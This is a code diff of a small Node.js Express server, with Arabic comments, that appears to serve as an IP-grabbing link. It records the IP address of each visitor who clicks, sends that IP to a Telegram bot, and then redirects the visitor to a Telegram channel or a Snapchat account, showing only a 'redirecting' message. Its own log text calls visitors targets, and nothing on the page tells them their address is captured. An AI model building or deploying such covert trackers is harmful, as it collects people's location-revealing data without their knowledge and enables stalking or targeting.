@@ -1,16 +1,27 @@
 const express = require('express');
 const app = express();
+const fetch = require('node-fetch'); // تأكد من تثبيت node-fetch
 const PORT = process.env.PORT || 3000;
 
-app.get('/uUl8iPwh5iYTVk', async (req, res) => {
+app.get('/', async (req, res) => {
+    // 1. استخراج المتغير (مثلاً ?to=snap)
+    const destination = req.query.to;
     const visitorIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    console.log("Target Link Clicked! Visitor IP: " + visitorIp);
-    
-    // إرسال تنبيه لتليجرام
+
+    // 2. الروابط
+    const telegramUrl = "https://t.me/uUl8iPwh5iYTVk";
+    const snapUrl = "https://www.snapchat.com/add/rossan2682";
+    let targetUrl = telegramUrl; // الافتراضي تليجرام
+
+    if (destination === 'snap') {
+        targetUrl = snapUrl;
+    }
+
+    // 3. إرسال التنبيه لتليجرام
     try {
         const token = process.env.TELEGRAM_TOKEN;
         const chatId = process.env.TELEGRAM_CHAT_ID;
-        const message = `🚨 New Visitor IP Detected!\nIP: ${visitorIp}\nTime: ${new Date().toISOString()}`;
+        const message = `🚨 New Visitor!\nTo: ${destination || 'Telegram'}\nIP: ${visitorIp}`;
         
         await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
             method: 'POST',
@@ -20,30 +31,23 @@ app.get('/uUl8iPwh5iYTVk', async (req, res) => {
     } catch (err) {
         console.log("Telegram Error: ", err);
     }
-    
-    // التوجيه
+
+    // 4. التوجيه
     res.send(`
         <!DOCTYPE html>
-        <html lang="ar">
+        <html>
         <head>
             <meta charset="UTF-8">
             <script>
-                window.location.href = "https://t.me/uUl8iPwh5iYTVk";
+                window.location.href = "${targetUrl}";
             </script>
         </head>
         <body>
-            <p style="text-align: center; margin-top: 50px;">جاري فتح تليغرام...</p>
+            <p style="text-align: center; margin-top: 50px;">جاري التحويل...</p>
         </body>
         </html>
     `);
 });
 
-app.get('/', (req, res) => {
-    res.send('Server is active.');
-});
-
 module.exports = app;
-
-app.listen(PORT, () => {
-    console.log("Server is running...");
-});
+app.listen(PORT, () => console.log("Server is running..."));
